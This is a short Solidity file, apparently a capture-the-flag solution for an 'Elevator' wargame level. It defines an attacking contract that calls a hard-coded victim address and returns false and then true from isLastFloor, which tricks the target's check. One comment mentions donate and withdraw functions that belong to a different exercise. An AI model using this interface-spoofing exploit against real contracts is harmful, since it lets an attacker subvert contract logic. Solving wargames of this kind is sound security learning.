// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

The target contract checks if the floor we passed is the last floor, but it makes this check
in the msg.sender, which should implement this isLastFloor method. To get to the last floor
we need to make a method that will return false then true.

We should be able to achieve that objective either by checking the target contract floor
inside the isLastFloor function. If the target floor is not the floor we received, then we
return false, if it is equal then we return true. Another way is to just create a boolean
variable that flips each time the function is called, thus giving the desired effect.*/

contract ElevatorAttack{

  // First we need to instantiate the victim contract
  Victim victim = Victim(0xCaf4Cefc2DcBbd387b003862B342A713F57a31A8);

  bool flip = true;

  function goToLastFloor() public payable {
    victim.goTo(13);
  }

  function isLastFloor(uint _floor) external returns(bool){
    flip = !flip;
    return flip;
  }

}

/* The easiest way to build an interface for another contract is to just copy the functions
"header" that you are going to use. We need the donate to have a balance and pass the withdraw
check, we also need the balanceOf so we can check the contract balance before calling the
function again so it doesn't revert.*/

interface Victim {
  function goTo(uint _floor) external;
}

